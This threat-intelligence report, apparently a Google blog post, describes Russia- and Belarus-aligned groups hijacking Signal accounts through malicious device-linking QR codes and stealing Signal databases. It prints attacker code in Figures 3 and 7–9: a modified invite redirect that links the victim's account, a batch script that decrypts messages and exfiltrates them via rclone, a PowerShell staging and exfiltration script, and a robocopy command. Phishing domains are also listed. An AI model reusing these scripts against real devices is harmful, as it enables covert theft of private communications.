---
title: "Signals of Trouble Multiple Russia-Aligned Threat Actors Actively Targeting Signal Messenger"
date: Wed, 19 Feb 2025 14:00:00 +0000
draft: false
type: posts
---
# Signals of Trouble Multiple Russia-Aligned Threat Actors Actively Targeting Signal Messenger





Written by: Dan Black Google Threat Intelligence Group (GTIG) has observed increasing efforts from several Russia state-aligned threat actors to compromise Signal Messenger accounts used by individuals of interest to Russia's intelligence services. While this emerging operational interest has likely been sparked by wartime demands to gain access to sensitive government

Written by: Dan Black

* * *

Google Threat Intelligence Group (GTIG) has observed increasing efforts from several Russia state-aligned threat actors to compromise Signal Messenger accounts used by individuals of interest to Russia's intelligence services. While this emerging operational interest has likely been sparked by wartime demands to gain access to sensitive government and military communications in the context of Russia's re-invasion of Ukraine, we anticipate the tactics and methods used to target Signal will grow in prevalence in the near-term and proliferate to additional threat actors and regions outside the Ukrainian theater of war.

Signal's popularity among common targets of surveillance and espionage activity—such as military personnel, politicians, journalists, activists, and other at-risk communities—has positioned the secure messaging application as a high-value target for adversaries seeking to intercept sensitive information that could fulfill a range of different intelligence requirements. More broadly, this threat also extends to other popular messaging applications such as WhatsApp and Telegram, which are also being actively targeted by Russian-aligned threat groups using similar techniques. In anticipation of a wider adoption of similar tradecraft by other threat actors, we are issuing a public warning regarding the tactics and methods used to date to help build public awareness and help communities better safeguard themselves from similar threats.

We are grateful to the team at Signal for their close partnership in investigating this activity. The latest Signal releases on [Android](https://github.com/signalapp/Signal-Android/commit/112874c08019a40b6f8f1dbbf84eb0ab4d796582) and [iOS](https://github.com/signalapp/Signal-iOS/commit/498b97033254c514404345efc1d4c29c1b076f6c) contain hardened features designed to help protect against similar phishing campaigns in the future. [Update](https://support.signal.org/hc/en-us/articles/360007059212-How-do-I-ensure-Signal-is-up-to-date) to the latest version to enable these features.

Phishing Campaigns Abusing Signal's "Linked Devices" Feature
------------------------------------------------------------

The most novel and widely used technique underpinning Russian-aligned attempts to compromise Signal accounts is the abuse of the app's legitimate "[linked devices](https://support.signal.org/hc/en-us/articles/360007320551-Linked-Devices)" feature that enables Signal to be used on multiple devices concurrently. Because linking an additional device typically requires scanning a quick-response (QR) code, threat actors have resorted to crafting malicious QR codes that, when scanned, will link a victim's account to an actor-controlled Signal instance. If successful, future messages will be delivered synchronously to both the victim and the threat actor in real-time, providing a persistent means to eavesdrop on the victim's secure conversations without the need for full-device compromise.

-   In remote phishing operations observed to date, malicious QR codes have frequently been masked as legitimate Signal resources, such as group invites, security alerts, or as legitimate device pairing instructions from the Signal website.
    
-   In more tailored remote phishing operations, malicious device-linking QR codes have been embedded in phishing pages crafted to appear as specialized applications used by the Ukrainian military.
    
-   Beyond remote phishing and malware delivery operations, we have also seen malicious QR codes being used in close-access operations. [APT44](https://cloud.google.com/blog/topics/threat-intelligence/apt44-unearthing-sandworm) (aka Sandworm or Seashell Blizzard, a threat actor attributed by [multiple](https://www.justice.gov/opa/pr/six-russian-gru-officers-charged-connection-worldwide-deployment-destructive-malware-and) governments to the Main Centre for Special Technologies (GTsST) within Main Directorate of the General Staff of the Armed Forces of the Russian Federation (GU), known commonly as the GRU) has worked to enable forward-deployed Russian military forces to link Signal accounts on devices captured on the battlefield back to actor-controlled infrastructure for follow-on exploitation.
    

Notably, this device-linking concept of operations has proven to be a low-signature form of initial access due to the lack of centralized, technology-driven detections and defenses that can be used to monitor for account compromise via newly linked devices; when successful, there is a high risk that a compromise can go unnoticed for extended periods of time.

UNC5792: Modified Signal Group Invites
--------------------------------------

To compromise Signal accounts using the device-linking feature, one suspected Russian espionage cluster tracked as UNC5792 (which partially overlaps with CERT-UA's [UAC-0195](https://cert.gov.ua/article/6278735)) has altered legitimate "[group invite](https://support.signal.org/hc/en-us/articles/360051086971-Group-Link-or-QR-code)" pages for delivery in phishing campaigns, replacing the expected redirection to a Signal group with a redirection to a malicious URL crafted to link an actor-controlled device to the victim's Signal account.

-   In these operations, UNC5792 has hosted modified Signal group invitations on actor-controlled infrastructure designed to appear identical to a legitimate Signal group invite.
    
-   In each of the fake group invites, JavaScript code that typically redirects the user to join a Signal group has been replaced by a malicious block containing the Uniform Resource Identifier (URI) used by Signal to link a new device to Signal (i.e., "sgnl://linkdevice?uuid="), tricking victims into linking their Signal accounts to a device controlled by UNC5792.
    

![Example modified Signal group invite hosted on UNC5792-controlled domain "signal-groups[.]tech"](https://storage.googleapis.com/gweb-cloudblog-publish/images/fig1-signal.max-1000x1000.png)

Figure 1: Example modified Signal group invite hosted on UNC5792-controlled domain "signal-groups\[.\]tech"

```
function doRedirect() {
if (window.location.hash) {
var redirect = "sgnl://signal.group/" + window.location.hash
document.getElementById('go-to-group').href = redirect
window.location = redirect
} else {
document.getElementById('join-button').innerHTML = "No group found."
window.onload = doRedirect
```

Figure 2: Typical legitimate group invite code for redirection to a Signal group

```
function doRedirect() {
var redirect = 'sgnl://linkdevice
uuid=h_8WKmzwam_jtUeoD_NQyg%3D%3D
pub_key=Ba0212mHrGIy4t%2FzCCkKkRKwiS0osyeLF4j1v8DKn%2Fg%2B'
//redirect=encodeURIComponent(redirect)
document.getElementById('go-to-group').href = redirect
window.location = redirect
window.onload = doRedirect
```

Figure 3: Example of UNC5792 modified redirect code used to link the victim's device to an actor-controlled Signal instance

UNC4221: Custom-Developed Signal Phishing Kit
---------------------------------------------

UNC4221 (tracked by CERT-UA as [UAC-0185](https://cert.gov.ua/article/6281632)) is an additional Russia-linked threat actor who has actively targeted Signal accounts used by Ukrainian military personnel. The group operates a tailored Signal phishing kit designed to mimic components of the [Kropyva](https://united24media.com/war-in-ukraine/ukraines-secret-weapon-kropyva-software-4026#:~:text=Kropyva's%20impact&text=Amongst%20the%20Ukrainian%20Armed%20Forces,applications%20across%20Ukraine's%20armed%20forces.) application used by the Armed Forces of Ukraine for artillery guidance. Similar to the social engineering approach used by UNC5792, UNC4221 has also attempted to mask its device-linking functionality as an invite to a Signal group from a trusted contact. Different variations of this phishing kit have been observed, including:

-   Phishing websites that redirect victims to secondary phishing infrastructure masquerading as legitimate device-linking instructions provisioned by Signal (Figure 4)
    
-   Phishing websites with the malicious device-linking QR code directly embedded into the primary Kropyva-themed phishing kit (Figure 5)
    
-   In earlier operations in 2022, UNC4221 phishing pages were crafted to appear as a legitimate security alert from Signal (Figure 6)
    

![Malicious device-linking QR code hosted on UNC4221-controlled domain "signal-confirm[.]site"](https://storage.googleapis.com/gweb-cloudblog-publish/images/fig4-signal.max-1000x1000.png)

Figure 4: Malicious device-linking QR code hosted on UNC4221-controlled domain "signal-confirm\[.\]site"

![UNC4221 phishing page mimicking the networking component of Kropyva hosted at "teneta.add-group[.]site". The page invites the user to "Sign in to Signal" (Ukrainian: "Авторизуватись у Signal"), which in turn displays a QR code linked to an UNC42](https://storage.googleapis.com/gweb-cloudblog-publish/images/fig5-signal.max-1000x1000.png)

Figure 5: UNC4221 phishing page mimicking the networking component of Kropyva hosted at "teneta.add-group\[.\]site". The page invites the user to "Sign in to Signal" (Ukrainian: "Авторизуватись у Signal"), which in turn displays a QR code linked to an UNC4221-controlled Signal instance.

![Phishing page crafted to appear as a Signal security alert hosted on UNC4221-controlled domain signal-protect[.]host](https://storage.googleapis.com/gweb-cloudblog-publish/images/fig6-signal.max-1000x1000.png)

Figure 6: Phishing page crafted to appear as a Signal security alert hosted on UNC4221-controlled domain signal-protect\[.\]host

Notably, as a core component of its Signal targeting, UNC4221 has also used a lightweight JavaScript payload tracked as PINPOINT to collect basic user information and geolocation data using the browser's GeoLocation API. In general, we expect to see secure messages and location data to frequently feature as joint targets in future operations of this nature, particularly in the context of targeted surveillance operations or support to conventional military operations.

Wider Russian and Belarusian Efforts to Steal Messages From Signal
------------------------------------------------------------------

Beyond targeted efforts to link additional actor-controlled devices to victim Signal accounts, multiple known and established regional threat actors have also been observed operating capabilities designed to steal Signal database files from Android and Windows devices.

-   APT44 has been observed operating WAVESIGN, a lightweight Windows Batch script, to periodically query Signal messages from a victim's Signal database and exfiltrate those most recent messages using Rclone (Figure 7).
    
-   As reported in 2023 by the [Security Service of Ukraine](https://ssu.gov.ua/en/novyny/sbu-exposes-russian-intelligence-attempts-to-penetrate-armed-forces-planning-operations-system) (SSU) and the UK's [National Cyber Security Centre](https://www.ncsc.gov.uk/static-assets/documents/malware-analysis-reports/infamous-chisel/NCSC-MAR-Infamous-Chisel.pdf) (NCSC), the Android malware tracked as Infamous Chisel and attributed by the respective organizations to Sandworm, is designed to recursively search for a list of file extensions including the local database for a series of messaging applications, including Signal, on Android devices.
    
-   Turla, a Russian threat actor attributed by the [United States](https://www.justice.gov/opa/pr/justice-department-announces-court-authorized-disruption-snake-malware-network-controlled) and [United Kingdom](https://www.gov.uk/government/publications/russias-fsb-malign-cyber-activity-factsheet/russias-fsb-malign-activity-factsheet) to Center 16 of the Federal Security Service (FSB) of the Russian Federation, has also operated a lightweight PowerShell script in post-compromise contexts to stage Signal Desktop messages for exfiltration (Figure 8).
    
-   Extending beyond Russia, Belarus-linked UNC1151 has used the command-line utility Robocopy to stage the contents of file directories used by Signal Desktop to store messages and attachments for later exfiltration (Figure 9).
    

```
if %proflag%==1 (
    C:\ProgramData\Signal\Storage\sqlcipher.exe %new% "PRAGMA key=""x'%key%'"";" ".recover" > NUL
    copy /y %new% C:\ProgramData\Signal\Storage\Signal\sqlorig\db.sqlite
    C:\ProgramData\Signal\Storage\rc.exe copy -P -I --log-file=C:\ProgramData\Signal\Storage\rclog.txt --log-level INFO C:\ProgramData\Signal\Storage\Signal\sqlorig si:SignalFresh/sqlorig
    del C:\ProgramData\Signal\Storage\Signal\log*
    rmdir /s /q C:\ProgramData\Signal\Storage\sql
    move C:\ProgramData\Signal\Storage\Signal\sql C:\ProgramData\Signal\Storage\sql
) ELSE (

    C:\ProgramData\Signal\Storage\sqlcipher.exe %old% "PRAGMA key=""x'%key%'"";" ".recover" > NUL
    C:\ProgramData\Signal\Storage\sqlcipher.exe %old% "PRAGMA key=""x'%key%'"";select count(*) from sqlite_master;ATTACH DATABASE '%old_dec%' AS plaintext KEY '';SELECT sqlcipher_export('plaintext');DETACH DATABASE plaintext;"
    C:\ProgramData\Signal\Storage\sqlcipher.exe %new% "PRAGMA key=""x'%key%'"";" ".recover" > NUL
    C:\ProgramData\Signal\Storage\sqlcipher.exe %new% "PRAGMA key=""x'%key%'"";select count(*) from sqlite_master;ATTACH DATABASE '%new_dec%' AS plaintext KEY '';SELECT sqlcipher_export('plaintext');DETACH DATABASE plaintext;"
    C:\ProgramData\Signal\Storage\sqldiff.exe --primarykey --vtab %old_dec% %new_dec% > %diff_name%
    del /s %old_dec% %new_dec%

    rmdir /s /q C:\ProgramData\Signal\Storage\sql
    move C:\ProgramData\Signal\Storage\Signal\sql C:\ProgramData\Signal\Storage\sql

    powershell -Command "move C:\ProgramData\Signal\Storage\log.tmp C:\ProgramData\Signal\Storage\Signal\log$(Get-Date -f """ddMMyyyyHHmmss""").tmp"
)
```

Figure 7: Code snippet from WAVESIGN used by APT44 to exfiltrate Signal messages

```
$TempPath = $env:tmp
$TempPath = $env:temp

$ComputerName = $env:computername
$DFSRoot = "\\redacted"
$RRoot = $DFSRoot + "resource\"

$frand = Get-Random -Minimum 1 -Maximum 10000

Get-ChildItem "C:\Users\..\AppData\Roaming\SIGNAL\config.json" | Out-File $treslocal -Append
Get-ChildItem "C:\Users\..\AppData\Roaming\SIGNAL\sql\db.sqlite" | Out-File $treslocal -Append

Get-ChildItem "C:\Users\..\AppData\Roaming\SIGNAL\config.json" | Out-File $treslocal -Append
Get-ChildItem "C:\Users\..\AppData\Roaming\SIGNAL\sql\db.sqlite" | Out-File $treslocal -Append


$file1 = $ComputerName + "_" + $frand + "sig.zip"
$zipfile = $TempPath + "\" + $file1
$resfile = $RRoot + $file1
Compress-Archive -Path "C:\Users\..\AppData\Roaming\SIGNAL\config.json" -DestinationPath $zipfile
Copy-Item -Path $zipfile -Destination $resfile -Force
Remove-Item -Path $zipfile -Force
```

Figure 8: PowerShell script used by Turla to exfiltrate Signal messages

```
C:\Windows\system32\cmd.exe /C cd %appdata% && robocopy 
"%userprofile%\AppData\Roaming\Signal" C:\Users\Public\data\signa /S
```

Figure 9: Robocopy command used by UNC1151 to stage Signal file directories for exfiltration

Outlook and Implications
------------------------

The operational emphasis on Signal from multiple threat actors in recent months serves as an important warning for the growing threat to secure messaging applications that is certain to intensify in the near-term. When placed in a wider context with other trends in the threat landscape, such as the growing commercial spyware industry and the surge of mobile malware variants being leveraged in active conflict zones, there appears to be a clear and growing demand for offensive cyber capabilities that can be used to monitor the sensitive communications of individuals who rely on secure messaging applications to safeguard their online activity.

As reflected in wide ranging efforts to compromise Signal accounts, this threat to secure messaging applications is not limited to remote cyber operations such as phishing and malware delivery, but also critically includes close-access operations where a threat actor can secure brief access to a target's unlocked device. Equally important, this threat is not only limited to Signal, but also extends to other widely used messaging platforms, including WhatsApp and Telegram, which have likewise factored into the targeting priorities of several of the aforementioned Russia-aligned groups in recent months. For an example of this wider targeting interest, see Microsoft Threat Intelligence's [recent blog post](https://www.microsoft.com/en-us/security/blog/2025/01/16/new-star-blizzard-spear-phishing-campaign-targets-whatsapp-accounts/) on a COLDRIVER (aka UNC4057 and Star Blizzard) campaign attempting to abuse the linked device feature to compromise WhatsApp accounts.  

Potential targets of government-backed intrusion activity targeting their personal devices should adopt practices to help safeguard themselves, including:

-   Enable [screen lock](https://support.google.com/android/answer/9079129?hl=en) on all mobile devices using a long, complex password with a mix of uppercase and lowercase letters, numbers, and symbols. Android supports alphanumeric passwords, which offer significantly more security than numeric-only PINs or patterns.
    
-   Install operating system updates as soon as possible and always use the latest version of Signal and other messaging apps.
    
-   Ensure [Google Play Protect](https://support.google.com/googleplay/answer/2812853?hl=en) is enabled, which is on by default on Android devices with Google Play Services. Google Play Protect checks your apps and devices for harmful behavior and can warn users or block apps known to exhibit malicious behavior, even when those apps come from sources outside of Play.
    
-   Audit linked devices regularly for unauthorized devices by navigating to the "Linked devices" section in the application's settings.
    
-   Exercise caution when interacting with QR codes and web resources purporting to be software updates, group invites, or other notifications that appear legitimate and urge immediate action.
    
-   If available, use two-factor authentication such as fingerprint, facial recognition, a security key, or a one-time code to verify when your account is logged into or linked to a new device.
    
-   iPhone users concerned about targeted surveillance or espionage activity should consider enabling [Lockdown Mode](https://support.apple.com/en-ca/guide/iphone/iph049680987/ios) to reduce their attack surface.
    

aside\_block

<ListValue: \[StructValue(\[('title', 'More insights on this threat activity'), ('body', <wagtail.rich\_text.RichText object at 0x3e894a8c64f0>), ('btn\_text', 'Listen now'), ('href', 'https://open.spotify.com/episode/3reADyxut9u4ueSPlCma8I'), ('image', <GAEImage: Defender's Advantage podcast>)\])\]>

Indicators of Compromise
------------------------

To assist organizations hunting and identifying activity outlined in this blog post, we have included indicators of compromise (IOCs) in a [GTI Collection](https://www.virustotal.com/gui/collection/b9885b58701486f26d370ea939aaffc263d5c4053696bfe82911247ef43da85a) for registered users.

See Table 1 for a sample of relevant indicators of compromise.

**Actor**

**Indicator of Compromise**

**Context** 

UNC5792

e078778b62796bab2d7ab2b04d6b01bf

Example of altered group invite HTML code 

add-signal-group\[.\]com

add-signal-groups\[.\]com

group-signal\[.\]com

groups-signal\[.\]site

signal-device-off\[.\]online

signal-group-add\[.\]com

signal-group\[.\]site

signal-group\[.\]tech

signal-groups-add\[.\]com

signal-groups\[.\]site

signal-groups\[.\]tech

signal-security\[.\]online

signal-security\[.\]site

signalgroup\[.\]site

signals-group\[.\]com

Fake group invite phishing pages

UNC4221

signal-confirm\[.\]site

confirm-signal\[.\]site

Device-linking instructions phishing page

signal-protect\[.\]host

Fake Signal security alert 

teneta.join-group\[.\]online

teneta.add-group\[.\]site

group-teneta\[.\]online

helperanalytics\[.\]ru

group-teneta\[.\]online

teneta\[.\]group

group.kropyva\[.\]site

Fake Kropyva group invites 

APT44

150.107.31\[.\]194:18000

Dynamically generated device-linking QR code provisioned by APT44

a97a28276e4f88134561d938f60db495

b379d8f583112cad3cf60f95ab3a67fd

b27ff24870d93d651ee1d8e06276fa98

WAVESIGN batch scripts 

Table 1: Relevant indicators of compromise

See Table 2 for a summary of the different actors, tactics, and techniques used by Russia and Belarus state-aligned threat actors to target Signal messages.

**Threat Actor** 

**Tactic** 

**Technique**

UNC5792

Linked device

Remote phishing operations using fake group invites to pair a victim's Signal messages to an actor-controlled device

UNC4221

Linked device

Remote phishing operations using fake military web applications and security alerts to pair a victim's Signal messages to an actor-controlled device

APT44

Linked device

Close-access physical device exploitation to pair a victim's Signal messages to an actor-controlled device

Signal Android database theft

Android malware ([Infamous Chisel](https://ssu.gov.ua/en/novyny/sbu-exposes-russian-intelligence-attempts-to-penetrate-armed-forces-planning-operations-system)) tailored to exfiltrate Signal database files

Signal Desktop database theft 

Windows Batch script tailored to periodically exfiltrate recent Signal messages via Rclone

Turla

Signal Desktop database theft 

Post-compromise activity in Windows environments

UNC1151

Signal Desktop database theft 

Use of Robocopy to stage Signal Desktop file directories for exfiltration

Table 2: Summary of observed threat activity targeting Signal messages

#### [Source](https://cloud.google.com/blog/topics/threat-intelligence/russia-targeting-signal-messenger/)

